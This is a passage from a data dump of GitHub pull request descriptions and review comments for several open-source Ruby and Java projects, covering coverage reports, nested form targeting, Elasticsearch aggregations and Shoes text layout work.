Status](https://coveralls.io/builds/2168315/badge)](https://coveralls.io/builds/2168315)\n\nCoverage increased (+0.02%) to 93.41% when pulling **7eb06a1efab4b6a3dc3efd34e70d4afd694f9d44 on ShockwaveNN:rubocop_fixes** into **4698e5743eb2af721fb8b4aff6812d1fa95100df on rubyzip:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2174056/badge)](https://coveralls.io/builds/2174056)\n\nCoverage increased (+0.06%) to 93.46% when pulling **b1bfb1a216dbfae6d4cf645d57b3e35abed4ebf6 on ShockwaveNN:rubocop_fixes** into **4698e5743eb2af721fb8b4aff6812d1fa95100df on rubyzip:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2182753/badge)](https://coveralls.io/builds/2182753)\n\nCoverage increased (+0.26%) to 93.65% when pulling **e21143483050383ddd8224e874f394ea5f609f1e on ShockwaveNN:rubocop_fixes** into **4698e5743eb2af721fb8b4aff6812d1fa95100df on rubyzip:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2182753/badge)](https://coveralls.io/builds/2182753)\n\nCoverage increased (+0.26%) to 93.65% when pulling **e21143483050383ddd8224e874f394ea5f609f1e on ShockwaveNN:rubocop_fixes** into **4698e5743eb2af721fb8b4aff6812d1fa95100df on rubyzip:master**.\n', 'I think I fixed almost all trivial cases, so I think it may be merged with master, because after that point fixes will be more dramatical, and may be lost in existing changes. Existing changes is small, but there is too much number of them. Also future fixes volumes will not be so high, as now ', 'Can you rebase with latest master?', '@simonoff Yes, of course I can rebase. I try to do it tomorrow', '@simonoff Done rebasing, also update rubocop and fix some more problems']"
643,ryanb/nested_form,192.0,"Previous association detection did stringification of the builder's object class. This doesn't work in situations such

```ruby
class Project < ActiveRecord::Base
  has_many :tasks, class_name: 'SpecialTask'
  accepts_nested_atttributes_for :tasks
end
```
I also converted readme to markdown syntax.","['This pull request [fails](http://travis-ci.org/ryanb/nested_form/builds/2171207) (merged df31dcd7 into 25901026).', 'This pull request [fails](http://travis-ci.org/ryanb/nested_form/builds/2181024) (merged 327af072 into 25901026).', 'maybe `rake db:schema:load` in `travis.yml` will help to pass specs?', 'This pull request [fails](http://travis-ci.org/ryanb/nested_form/builds/2185525) (merged 3af90efd into 25901026).', 'Thanks!']"
644,ryanb/nested_form,235.0,"These changes allow nested form elements to be appended to any DOM element rather than just inserting before the link.  This is useful when you're adding to a `TABLE`, `UL`, `OL`, or any other element that does not share the same parent as the `add_to_link`.

Example usage:

    %table
      %thead
        %th
          %td Ingredient
          %td Quantity
          %td Unit
          %td &nbsp;
      %tbody#ingredients
        =f.fields_for :recipes_ingredients, wrapper: false do |i|
          %tr.fields
            %td= i.input :ingredient_id, label: false, collection: Ingredient.order(:name)
            %td= i.input :quantity, label: false
            %td= i.input :unit_id, label: false, collection: Unit.order(:name)
            %td= i.link_to_remove 'Remove'
    %p= f.link_to_add 'Add Ingredient', :recipes_ingredients, target: 'ingredients'
","['Also, to clarify, [this solution](https://github.com/ryanb/nested_form/wiki/How-To:-Render-nested-fields-inside-a-table) is not feasible for my situation since it assumes that every nested form behaves the same.  I needed something more dynamic, which is why I added the `:target` option.', ""I think I've addressed the three things you pointed out.  Does everything look good to merge?  Do you want me to squash my commits?"", 'Could you please update README mentioning this feature?', 'Hmm, I tried to squash my commits, and it just added *more* commits instead of reducing the number of commits.  Will keep trying to figure out how to do this...', '@mhuggins [this](http://blog.steveklabnik.com/posts/2012-11-08-how-to-squash-commits-in-a-github-pull-request) might be helpful for you', 'Alright, I think I finally got it. :)  Thanks!', 'Thanks!', 'Thanks for this!', ""No problem, glad it's helping other people out too! :smile: Not sure when the next numbered release is, but at least it's in master."", "":+1: + 1 for release. Spent a few minutes today scratching my head as to why data-target wasn't working (since it appears in the readme now). Great work @mhuggins"", 'Has this feature been released already?', 'I tried this and it just doesn\'t work. I literally went line by line and tried it exactly as @mhuggins has it earlier in this thread. However, no luck. Here\'s my code:\r\n\r\n```\r\n     %table.table.table-bordered\r\n        %thead\r\n          %th\r\n            %td Description\r\n            %td Quantity\r\n            %td Rate\r\n            %td &nbsp;\r\n        %tbody#line-items\r\n          = f.fields_for :invoice_line_items, :wrapper => false do |line_item|\r\n            %tr.fields\r\n              %td= line_item.text_field :description, label: false\r\n              %td= line_item.text_field :quantity, :class => ""input-mini"", label: false\r\n              %td= line_item.text_field :rate, :class => ""input-mini"", label: false\r\n              %td= line_item.link_to_remove ""X""\r\n      %p= f.link_to_add ""Add"", :invoice_line_items, target: ""line_items""\r\n```\r\n\r\nalso tried the link_to_add like so:\r\n\r\n```\r\n%p= f.link_to_add ""Add"", :invoice_line_items, :data => { :target => ""#line-items"" }\r\n```', '@mberman84 Considering README you might need to change it to:\r\n\r\n```haml\r\n%p= f.link_to_add ""Add"", :invoice_line_items, data: { target: ""#line-items"" }\r\n```', ""@mberman84 I didn't saw that you already tried this variant but I still think that it should work well."", ""@lest it turns out that the js file that comes with the most recent version of the gem (//= require jquery_nested_form) has the old version of insertFields, so target didn't work, which took quite a while to figure out. So I had to put this in my application.js file:\r\n\r\n```\r\n$(function ($) {\r\n  window.NestedFormEvents.prototype.insertFields = function(content, assoc, link) {\r\n    var target = $(link).data('target');\r\n    if (target) {\r\n      return $(content).appendTo($(target));\r\n    } else {\r\n      return $(content).insertBefore(link);\r\n    }\r\n  };\r\n});\r\n```"", '@mberman84 - This change is currently only in master, so make sure you use that instead of the versioned gem.', ""@mhuggins I guess I'm still a little new but when I see the explanation of this feature in the docs, I assumed it was in the versioned gem:) Might want to note that it isn't available unless you get the master version. "", ""@mberman84 - I have no control over the versioning and this being released, I simply submitted the accepted pull request.  See the other comments in this very thread to see that others have mentioned the same concern.  It's up to the repo owner or collaborators to release a new version that includes this."", ""@mhuggins Sorry, didn't mean to sound ungrateful. This feature is awesome, was just pulling my hair out trying to figure out why it wasn't working. "", ""You didn't sound ungrateful, sorry if I came across as such!  Glad to see this is being used by others, and I apologize for the confusion in the docs as best as I can offer. :)""]"
645,sanemat/tachikoma,130.0,,[]
646,sanemat/tachikoma,150.0,,"['\n[![Coverage Status](https://coveralls.io/builds/1800917/badge)](https://coveralls.io/builds/1800917)\n\nCoverage remained the same at 68.0% when pulling **10df89d390a338484e5e0c159c4e5573159da43b on refactor/use-splat-operator** into **7c470e6baf01e479e425ef32dada6a969ca17fe2 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1801071/badge)](https://coveralls.io/builds/1801071)\n\nCoverage remained the same at 68.0% when pulling **86119d5bd3cd783d5e7d6811b4b0e2220b058515 on refactor/use-splat-operator** into **7c470e6baf01e479e425ef32dada6a969ca17fe2 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1801090/badge)](https://coveralls.io/builds/1801090)\n\nCoverage remained the same at 68.0% when pulling **277e7959fbefb038830f2043c9284b69fb6f8c55 on refactor/use-splat-operator** into **7c470e6baf01e479e425ef32dada6a969ca17fe2 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1801090/badge)](https://coveralls.io/builds/1801090)\n\nCoverage remained the same at 68.0% when pulling **277e7959fbefb038830f2043c9284b69fb6f8c55 on refactor/use-splat-operator** into **7c470e6baf01e479e425ef32dada6a969ca17fe2 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1801099/badge)](https://coveralls.io/builds/1801099)\n\nCoverage remained the same at 68.0% when pulling **6690920761983d3f9de98785b447b0544b378ba6 on refactor/use-splat-operator** into **7c470e6baf01e479e425ef32dada6a969ca17fe2 on master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1801124/badge)](https://coveralls.io/builds/1801124)\n\nCoverage remained the same at 68.0% when pulling **b6c85453b569a6d9de72694851a423268cf649e2 on refactor/use-splat-operator** into **7c470e6baf01e479e425ef32dada6a969ca17fe2 on master**.\n']"
647,searchbox-io/Jest,183.0,"I have create three ways to get aggregation data from a search response.

1) End user can call `get<X>Aggregation(String aggName)` where X is the type of
aggregation expected and agg name is the name of the aggregation.

2) User can call `getAggregation(String aggName, Class<T> aggType)` where
aggName is the name of the aggregation and aggType is the type expected for
that particular aggregation.

3) User can call `getAggregations(Map<String, Class<T>> nameToTypeMap)` which
provides a map of names to expected types for this level of aggregation.
A list of aggregations of the given types will be returned as a result.

In order to handle nested aggregations, the root `Aggregation` class contains all three methods.
The `getAggregations()` call in `SearchResult` returns the root level aggregation.
Thus to get an average aggregation named 'avg1' the end user would make a call like:
`searchResult.getAggregations().getAvgAggregation('avg1')` which would then have the
`getAvg` method available. Nested aggregations could then be achieved by nesting these calls to
the aggregations returned at each call:
`searchResult.getAggregations.getTermsAggregation('term1').getAvgAggregation('avg1')`

Tests were added for each of these Aggregation objects with the objective of testing
all methods of a particular aggregation object in the case where a user provides
a proper name, and in the case where they provide a bad name by which to get the
aggregation.

Finally, many of these methods have the potential to create null values, as a bad
name will lead to no data being returned. I have commented in JavaDoc style these
methods with the potential to return null so that end users will be aware of the
possibility.","[""I'm stumped on this test failure. The test works locally when I run it in isolation, but if I run the whole library of tests it fails. It looks like it's not finding the extra item in the background set, causing the score to be off. If anyone has any ideas what could be causing this please let me know."", 'Do you mind also adding yourself to the thanks section in readme (within this pr) please?', ""I'd appreciate it if the `equals` and `hashCode` implementations used the builder from commons as demonstrated in `AbstractAction`."", ""Will work on suggested changes, though as noted I'm still having trouble passing all the test. Also, do y'all prefer new commits to be included as such? Or rebase down to a single commit per PR?"", '[No rebase on public repositories](https://www.atlassian.com/git/tutorials/rewriting-history/git-rebase/) please :)', 'I have attempted to ignore specific tests to see if I can narrow down to a single point of failure, but have not been able to create any consistently reproducible results.']"
648,sethvargo/chef-sugar,31.0,Fixes #30,[]
649,sethvargo/chef-sugar,38.0,Fixes #23,['+1']
650,sevntu-checkstyle/sevntu.checkstyle,185.0,,"['not sure why that was changed back, code should be like  : \r\n1. utils method should have no relation to class fields if possible\r\n2. util method have to be static\r\n\r\n```\r\nprotected boolean isClassEnumeration(DetailAST aAST) {\r\n   return hasMembers(aAST, mExcludes);\r\n }\r\n\r\nprivate static boolean hasMembers(DetailAST aAST, String[] excludes)\r\n```\r\n\r\nplease to last update in your code.', ""Daniil or Ivan please do code review, I am agree with Pavel's changes."", '@romani hasMembers() method fixed', ""@daniilyar  or @isopov  please do code review, Pavel's changes are ready to merge to my mind."", 'Fixed all except \r\n> I\'m taking about checking precondition and throwing IllegalArgumentException if it is not met.\r\n\r\nWhat is the conclusion? Should i get rid of this check?\r\n\r\nBTW:\r\n> In method argument is called ""aConstRegexp"" but in javadoc - ""aObjectRegexp""\r\n\r\nWhy do no we use Checkstyle to check SevNTU source code?', '> What is the conclusion? Should i get rid of this check?\r\n\r\nAs we decided to make protected method as private , we can remove that argument validation as private method always under control. It was reasonable to have it only in case method is public or protected and that validation is located in that method.\r\nSo please remove that validation.\r\n\r\n> Why do no we use Checkstyle to check SevNTU source code?\r\n\r\nThat is purely historical reason (I can explain reasons in skype only, too much to type), and we do plan to switch checkstyle validation over itself - we have no human resources to make it :( .\r\nAdditionally that model for Checkstyle validation over itself is not clear for me now. Righ now we have such in main project, but even there it does not work properly - newly created checks are not inserted in validation process (but should be done automatically). In the same time new Check will result in massive re-factoring over the rest of code that is difficult to do, but would be the best example of Checks testing. ..... one day we will do this... you are welcome with proposals and contributions in this area.\r\n', 'Removed check for node type in hasMembers()', 'Looks like, all changes are done, code is merged to our repository.\r\n\r\n@pbaranchikov , thank you very much for your persistence in making contribution. We do appreciate your involvement in our project.']"
651,shoes/shoes4,444.0,"In the interest of getting feedback early and often, here is preliminary code that relates to Issue #436. Do not merge. 

I still need to add tests and additional code related to the group attributes. I'm also struggling with where to put radio_groups currently in Shoes::Swt::Radio. 

I would really appreciate some feedback. Thanks!","['\n[![Coverage Status](https://coveralls.io/builds/234907/badge)](https://coveralls.io/builds/234907)\n\nCoverage increased (+0.4%) when pulling **1b753ff27c2772096bb6c252b5385b827a73e6f0 on rjack1201:radio_grouping** into **a456d57f12f7fc8f96aaf3e42f252dcdf8b68207 on shoes:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/235827/badge)](https://coveralls.io/builds/235827)\n\nCoverage increased (+0.43%) when pulling **f8c73e5023b7963797f8c0dad0c7790f450bf1dd on rjack1201:radio_grouping** into **a456d57f12f7fc8f96aaf3e42f252dcdf8b68207 on shoes:master**.\n', ""Hey there,\r\n\r\nthanks a lot for your continued work on shoes :-)\r\n\r\nI hope that this was/is the kind of feedback you were looking for. I'd hope that there would be another way to do this e.g. not managing it manually, but the code seems pretty clear and easy to maintain to me so I wouldn't mind having that manual option I just think SWT should have something here :)\r\n\r\nMore specs for RadioGroup and its functionality would also be very helpful.\r\n\r\nCheers and thanks!\r\nTobi"", ""This was exactly the type of feedback I was looking for. Many thanks!!!\r\n\r\nThe SWT way to handle radio group is a composite for each radio group. This can cause problems for other widgets if the composite is on top.\r\n\r\nI will definitely add more specs, but it may take awhile because I'm still learning rspec."", ""Well let us know if we can help in any way. I think it helps to look at other specs to get a rough sense of it.\r\n\r\nFor this I'd wanna test that radio buttons get added to groups, that they get added to the correct groups and then removed from them if needed. Also maybe if the selection listeners get removed. Well just as a start. Cheers :-)"", ""@PragTob Can you please review the radio_group_spec.rb and radio_spec.rb files? I'm a little stuck with a couple of the radio_spec test cases (see my comments). I would appreciate if you could point me in the right direction.\r\n\r\nThanks!"", '\n[![Coverage Status](https://coveralls.io/builds/240989/badge)](https://coveralls.io/builds/240989)\n\nCoverage decreased (-0.24%) when pulling **c049b55a19cf0294eae1351dc7ef3214fb4594f4 on rjack1201:radio_grouping** into **a456d57f12f7fc8f96aaf3e42f252dcdf8b68207 on shoes:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/244530/badge)](https://coveralls.io/builds/244530)\n\nCoverage increased (+0.44%) when pulling **aaab3175cbf0db35752c0e9b67d9df0b910382d2 on rjack1201:radio_grouping** into **a456d57f12f7fc8f96aaf3e42f252dcdf8b68207 on shoes:master**.\n', 'I figured out how to add additional tests. IMHO, this is ready to merge.', ""Looks really good, thanks! =)\r\n\r\nSee my comments. I'd especially welcome the  emptylines after it blocks everywhere :-)\r\n\r\nAlso for tests, I consider the logic of `select_only_one_radio_in_group(selected_radio) ` crucial to how/why this works so a test that somehow tests that behavior would be great!"", 'Thanks!  ""select_only_one_radio_in_group(selected_radio)"" is a private method. Do you normally test private methods with rspec? Or do you test the public methods that use the private method in order to test the behavior?\r\n', 'Only test public :)', 'Yes :-) Sandi Metz has brilliant rules about this in her book Practical Object Oriented Design with Ruby. Point being that private methods are subject to change etc. - what you really want to test is the public interface e.g. what other classes actually do use. :-)', '\n[![Coverage Status](https://coveralls.io/builds/249804/badge)](https://coveralls.io/builds/249804)\n\nCoverage increased (+0.66%) when pulling **4d4004be658e7959468507df668aa83bce3e8b73 on rjack1201:radio_grouping** into **a456d57f12f7fc8f96aaf3e42f252dcdf8b68207 on shoes:master**.\n', ""I've incorporated changes resulting from comments above. \r\n\r\nThe one thing I'm stuck on is how to test that a RadioGroup selects only one button in the group when a new button is selected. This behavior is part of a selection_listener callback which gets created during :add. Any suggestions or is it not worth the trouble?"", ""As it is used in the callback from another class I think it is rather a public methdod as it is called from somewhere else. It works as a private method due to ruby block scoping magic but that's well.. magic. If you were to implement the SelectionListener without a block then it would need the radio group as an argument/instance variable in order to reference it.\r\n\r\nSo I'm cool with making it public and then test it as such.\r\n\r\nThanks for your work!\r\nTobi"", '\n[![Coverage Status](https://coveralls.io/builds/250002/badge)](https://coveralls.io/builds/250002)\n\nCoverage remained the same when pulling **5501bacf36e592b60526828099aac4f6156b9b19 on rjack1201:radio_grouping** into **a456d57f12f7fc8f96aaf3e42f252dcdf8b68207 on shoes:master**.\n', '@PragTob - OK...I understand the relationship between ""include Enumerable"" and def_delegators now. :each is required for enumerables and :length and :empty? are additional convenience methods.\r\n\r\nHere to hoping that this is good to merge now :pray: \r\n\r\nOf course, I always appreciate additional comments and thanks to all of you (especially @PragTob) for all of your helpful comments.', 'Super awesome! Thanks a thousand times!']"
652,shoes/shoes4,457.0,"Changes to address #402. If a string is passed for a height/width, it is checked for being formatted as a percentage, and applied as a relative dimension of the parent.

Supports negative percents, along with whole integer or floats for the numeric value. Any other non-matching string value will be ignored.

Given that behavior of ignoring invalid strings, are there other cases anyone can think of that we'd want to handle out of the box to make it simpler and kinder? Looking over it now, I'm thinking that maybe stripping whitespace might be a good idea, so someone could say ""50 %"" and it would still work... but I don't want to get too crazy trying to guess what they're doing.","['\n[![Coverage Status](https://coveralls.io/builds/269231/badge)](https://coveralls.io/builds/269231)\n\nCoverage increased (+0.93%) when pulling **a9f453eb9e68c00fc04df2683dd6c23b3116d642 on jasonrclark:percentage_widths** into **30ba23014b141a50b4aee9fff443ea8c09a7f311 on shoes:master**.\n', ""Having thought it, I couldn't help myself adding in the whitespace handling. :smile: "", '\n[![Coverage Status](https://coveralls.io/builds/269248/badge)](https://coveralls.io/builds/269248)\n\nCoverage increased (+0.93%) when pulling **b9762099bd99f76eda4349f6f95b4ff54748d925 on jasonrclark:percentage_widths** into **30ba23014b141a50b4aee9fff443ea8c09a7f311 on shoes:master**.\n', 'Thanks for your work :heart: \r\n\r\nSee the small-ish comments. And a big :+1: from me on the specs!', ""Excellent feedback. I'll definitely move the validation and keep the errors silent for the time being.\r\n\r\nIs there a standard way to emit something to the shoes console as a warning? I did like that idea for giving some info that something went wrong."", 'see [`warn`](https://github.com/shoes/shoes4/blob/20dff54c56b0163ac4938e6c644df64678d75740/lib/shoes/builtin_methods.rb#L28)', ""I'm not quite sure if warn is available in that context though. It should only be defined on App/Slot and the main object."", '\n[![Coverage Status](https://coveralls.io/builds/280541/badge)](https://coveralls.io/builds/280541)\n\nCoverage increased (+0.92%) when pulling **238ddab34b395f8d5cbe25b649a6540526e498c6 on jasonrclark:percentage_widths** into **30ba23014b141a50b4aee9fff443ea8c09a7f311 on shoes:master**.\n', 'I found was keeping to the ""don\'t crash, just ignore on bad input"" required a little different tactics than we were discussing. Specifically, we *do* need to handle all `String` input, not just ones matching our regex, or later processing in the `Dimensions` class will crash on the string being passed through.\r\n\r\nMy compromise on that was to alter the names accordingly and make the `nil` return more explicit.\r\n\r\nDidn\'t find that the app `warn` was accessible in a meaningful way from within `Dimensions`, or at least I couldn\'t see it outputting anything if I tried to call `warn` on the `@parent`.\r\n\r\nVery open if the consensus was that invalid, non-percent string should just crash. Will only take a tweak to the spec and minor revising to get that behavior instead, but this seemed most in line with the existing shoes philosophy.', ""Awesome, thank you!\r\n\r\nI just took the liberty of replacing the global variable access with .match and a temporary variable. Don't like global variables :-)\r\n\r\nCheers,\r\nTobi"", ""Agreed on the globals. Those crept in while I was revising and condensing things, but didn't continue to make any sense the way the code actually ended up. Thanks!""]"
653,shoes/shoes4,607.0,"Been a while since I started this, but picking it back up to see where I can get and wanted any early feedback folks might have.

The basic problem is that having split apart is documented in #518. The approach I've taken is to pull out a class, `FittedTextLayoutCollection` (don't love the name, so fire away with renaming suggestions) that will contain the potentially multiple layouts and properly apply operations to the right layouts and ranges within those layouts when requested.

Right now it gets the default style, the drawing command, and has the beginnings of applying the ranged styles to the layouts.

Lots I'd still like to see done. Things that I think have to happen before this PR should go forward:
- [x] Wire up to actually use the `FittedTextLayoutCollection` for the segment styling
- [x] Check for `Shoes::Span` before applying styling
- [x] Apply `Shoes::Link` styling (and additional clickable logic) within segments
- [x] Merge from master to get back up to date since this branch is a kind of stale

Other ideas that might happen along the way or could be their own PR:
- [x] Consider making a `lib/shoes/swt/text_block` directory since the number of classes in support of the flowing text is getting rather large. (entered as #629)
- [x] Extract classes such as `TextStyleFactory` and `TextFontFactory` to their own file that are currently lumped in with `TextBlockPainter` (for instance).
- [x] Use the new layout collection for treatment of the cursor placement in the text blocks too. (entered as #630)","["":+1: :+1: :star: jay! Thanks for working on this! =) Needs a merge with master though... :o\r\n\r\nI'll try to give it a more in depth look soon, but overall it's an idea I wanted to have for a long time!\r\n\r\nAlso pro on all the additional ideas!\r\n\r\nCheers,\r\nTobi"", ""At this point should be styling from sub-spans properly, and also applying styling from links properly as well (although no clickable on those yet--that'll be up next).\r\n\r\nAlso merge back from master--relatively simple stuff, pending on one test which I haven't had time to debug but will restore before this PR lands."", ""Wohooo thanks @jasonrclark - regarding the test, can you post which one it is an the error? Maybe it's one I recently added and I can help :-)"", ""@PragTob It does seem to be that recent test. Code is at https://github.com/jasonrclark/shoes4/blob/links_across_layouts/spec/swt_shoes/text_block_painter_spec.rb#L205-L215\r\n\r\nThat fails with this message:\r\n\r\n```\r\n  1) Shoes::Swt::TextBlockPainter text_styles sets the font size to 50\r\n     Failure/Error: expect(::Swt::Font).to receive(:new).with(anything, anything, 50, anything)\r\n       (<Java::OrgEclipseSwtGraphics::Font (class)>).new(#<RSpec::Mocks::ArgumentMatchers::AnyArgMatcher:0x286c5414>, #<RSpec::Mocks::ArgumentMatchers::AnyArgMatcher:0x600401c7>, 50, #<RSpec::Mocks::ArgumentMatchers::AnyArgMatcher:0x2710e110>)\r\n           expected: 1 time with arguments: (#<RSpec::Mocks::ArgumentMatchers::AnyArgMatcher:0x286c5414>, #<RSpec::Mocks::ArgumentMatchers::AnyArgMatcher:0x600401c7>, 50, #<RSpec::Mocks::ArgumentMatchers::AnyArgMatcher:0x2710e110>)\r\n           received: 0 times with arguments: (#<RSpec::Mocks::ArgumentMatchers::AnyArgMatcher:0x286c5414>, #<RSpec::Mocks::ArgumentMatchers::AnyArgMatcher:0x600401c7>, 50, #<RSpec::Mocks::ArgumentMatchers::AnyArgMatcher:0x2710e110>)\r\n     # ./spec/swt_shoes/text_block_painter_spec.rb:212:in `(root)'\r\n```\r\n\r\nI suspect it's pretty simple, but just haven't had any time at all to look at it more closely."", 'Will take a look at this PR and the spec tomorrow (hopefully) or the weekend at the latest, thanks jason! =D', 'Gave the code a good read, looks really good! All just minor remarks, thank you and keep it up! =D', 'Thanks for the close read-through! Love the feedback, and hopefully will get back to polishing this off this week.', ""I also sent a pull request your way regarding the failing spec =) jasonrclark/shoes4#3\r\n\r\nNow it is only failing because behavior is actually broken - I wrote that spec (which is too tightly coupled to impl details unfortunately) as a regression spec for a bug where font sizes in spans were not applied properly.\r\n\r\nThinking of the time you started this work maybe it wasn't in by then and got lost in the merge. For reference the commit that fixed it was 0f6ba294\r\n\r\nAnd a little program:\r\n\r\n```ruby\r\nShoes.app do\r\n  stack do\r\n    para span('BIG IN JAPAN', size: 50)\r\n    para 'Trolololol', span(' Span ', size: 50), 'figaro'\r\n  end\r\nend\r\n```\r\n\r\nwhich looks like this on master: \r\n![screenshot from 2014-03-19 17 24 17](https://f.cloud.github.com/assets/606517/2462722/41da6010-af84-11e3-9c55-a95a08e81ee9.png)\r\n(never mind the overlap issue, that's a layouting issue for text blocks with different sizes)\r\n\r\nand like this on the branch:\r\n\r\n![screenshot from 2014-03-19 17 23 55](https://f.cloud.github.com/assets/606517/2462735/577886fe-af84-11e3-8c89-cb502852cd31.png)\r\n\r\nNo time to help out fix it atm but I think you are more adept at fixing it than I'm - but could have time if needed later this week.\r\n\r\nCheers!\r\nTobi\r\n\r\n"", '\n[![Coverage Status](https://coveralls.io/builds/608163/badge)](https://coveralls.io/builds/608163)\n\nCoverage decreased (-0.17%) when pulling **ae5d40c2db7e822d5aaba3073c49da14bc016143 on jasonrclark:links_across_layouts** into **0aa589e3af6e43c2c6f8121f54590eb333e48865 on shoes:master**.\n', '@jasonrclark I love what you are doing here. Solid concept, and developing nicely!', ""Thanks @PragTob for that regression report too. With the linked commit it was easy to get back into place.\r\n\r\nAlso found that the problem with the tests was due to a difference between the stubbed text and the stubbed length of the range we were requesting. I've lined these up in the test, but also made the `layout_ranges` method a little more resilient if it's handed too big a range like that. (It was returning two range+layout pairs, each with the same layout and different ranges. Definitely not expected behavior)."", '\n[![Coverage Status](https://coveralls.io/builds/618368/badge)](https://coveralls.io/builds/618368)\n\nCoverage remained the same when pulling **d81014b7ca7e2fe02570d9e5e51781289ed21ae7 on jasonrclark:links_across_layouts** into **0aa589e3af6e43c2c6f8121f54590eb333e48865 on shoes:master**.\n', ':+1:  Jay sounds good, love to see this move forward! Thanks for your work!', ""@PragTob Did a little bit of what we talked about with regards to `Span` + `Link`. This tightened things up a bit, although hopefully there will be more opportunities as I get further along\r\n\r\nStarted in on actually doing the hard work of making clickable link areas based on the (potentially) multi-layout ranges we've got with the first step of abstracting out a class to do the hard part :grinning: Interactions between the layout collection and instantiating my new `Shoes::Swt::LinkSegment` class are working as expected, so next time I get time to work on this, I should be able to start getting `LinkSegment` to actually respond to clicking."", '\n[![Coverage Status](https://coveralls.io/builds/622257/badge)](https://coveralls.io/builds/622257)\n\nCoverage remained the same when pulling **49835deca19b136821b50e83b0bdd93c372d74d3 on jasonrclark:links_across_layouts** into **0aa589e3af6e43c2c6f8121f54590eb333e48865 on shoes:master**.\n', ':clap: Sounds great! :clap: ', ""All right, I believe I've gotten this to where I wanted it to be and I'm set for any further review, testing suggestions, etc. before getting it merged.\r\n\r\nI spawned off a few issues for other clean-up bits and one minor regression, but I'm keen to land this rather than let it carry on much longer. Will try to not bundle so much together in on PR next time (again :blush:)\r\n\r\n@PragTob @wasnotrice @KCErb any other comments before heading forward with this?"", '\n[![Coverage Status](https://coveralls.io/builds/659459/badge)](https://coveralls.io/builds/659459)\n\nCoverage remained the same when pulling **831747aad64bd44c05f4d551430d7927f1118634 on jasonrclark:links_across_layouts** into **86927ab3e7665f917f4f252bb786d6655824c779 on shoes:master**.\n', 'Great work @jasonrclark - thank you! :clap: \r\n\r\nI agree with getting this in as soon as possible, I hope I\'ll have some time to go over it and test it out tomorrow. =)\r\n\r\nDo you have like a list of issues it fixes? Would be good to have and go over them! Also i found myself when going over issues thinking ""maybe this is already fixed in #607"" so would be nice to know where I was actually right :-)\r\n\r\nCheers!\r\nTobi', ""Looking over issues, here's what I've got:\r\n\r\n* Resolves #518 (primary issue that sparked the work).\r\n* Resolves #293 (noticed from it that we didn't need the conditional in `Clickable` anymore. Hurray!)\r\n* Put notes on #542. Short story, link works, layout still looks weird but I suspect is actually correct.\r\n* Notes on #588, but it isn't really helped by these changes.\r\n* Doesn't help #604 \r\n* Doesn't help #528 \r\n\r\nThat's what I've been able to dig up. Look forward to hearing anything else you've got @PragTob!"", ""Any word on how this affects #626?\r\n\r\nBesides that I'm excited to see so many issues go in one shot! Strong work!"", ""Felt like I was missing one. Doesn't look like #626 is changed at all by this, so doesn't appear to be styling/lack-thereof, but a problem in the fitting logic instead. I'll give it a deeper look while I'm investigating #594 for the alpha since I suspect they're both in the same neighborhood (although likely not directly related...) Thanks for reminding me on this one @KCErb!"", ""As noted in the comments, super duper happy with this :+1: :joy: :clap: \r\n\r\nWill just give it another whirl shortly (e.g. trying it out with a few samples etc.) but code wise it's awesome!"", ""Gave it another whirl! Looks good @jasonrclark ! =)\r\n\r\nHowever there seems to be a regression, `simple-editor.rb` breaks for me:\r\n\r\n```\r\ntobi@big-one:~/github/shoes4$ bin/ruby-shoes samples/simple-editor.rb \r\nNoMethodError: undefined method `left' for #<Shoes::Swt::FittedTextLayout:0x63f3ca72>\r\n      new_position at /home/tobi/github/shoes4/lib/shoes/swt/text_block_cursor_painter.rb:29\r\n   draw_textcursor at /home/tobi/github/shoes4/lib/shoes/swt/text_block_cursor_painter.rb:19\r\n              draw at /home/tobi/github/shoes4/lib/shoes/swt/text_block_cursor_painter.rb:11\r\n  draw_text_cursor at /home/tobi/github/shoes4/lib/shoes/swt/text_block_painter.rb:29\r\n      paintControl at /home/tobi/github/shoes4/lib/shoes/swt/text_block_painter.rb:19\r\n      paintControl at Shoes$$Swt$$TextBlockPainter_123218490.gen:13\r\n              open at /home/tobi/github/shoes4/lib/shoes/swt/app.rb:30\r\n          open_gui at /home/tobi/github/shoes4/lib/shoes/app.rb:188\r\n        initialize at /home/tobi/github/shoes4/lib/shoes/app.rb:33\r\n               app at /home/tobi/github/shoes4/lib/shoes/app.rb:15\r\n            (root) at /home/tobi/github/shoes4/samples/simple-editor.rb:2\r\n              load at org/jruby/RubyKernel.java:1101\r\n            (root) at /home/tobi/github/shoes4/lib/shoes/cli.rb:1\r\n       execute_app at /home/tobi/github/shoes4/lib/shoes/cli.rb:73\r\n            (root) at bin/ruby-shoes:6\r\n```\r\n\r\nE.g. I guess the text block cursor is broken.\r\n\r\nHere is a simpler script reproducing the error:\r\n\r\n```ruby\r\nShoes.app do\r\n  pa = para 'lol'\r\n  pa.cursor = 1\r\nend\r\n```\r\n\r\nI'll leave it up to you whether to address this in this PR or make a separate issue and address it there. I really want to get this in asap - maybe it's a quick fix though :)\r\n\r\nCheers and thanks!\r\nTobi"", 'Traveling away from internet for a few days, but the regressions here are minor compared to the improvements. Merge and fix!', 'Made a few minor clean-ups and fixed that regression (simple rename). Shall I merge? :hammer: ', 'Thou shall merge! :hammer: :smile: ']"
654,shoes/shoes4,834.0,"Hi all,

This one passes tests and I ran through a few samples and it seems to behave as expected!

I did make a bunch of changes that I'll comment on inline which should be reviewed. I'm pretty sure this can be improved in a couple of places but I'm not sure how.

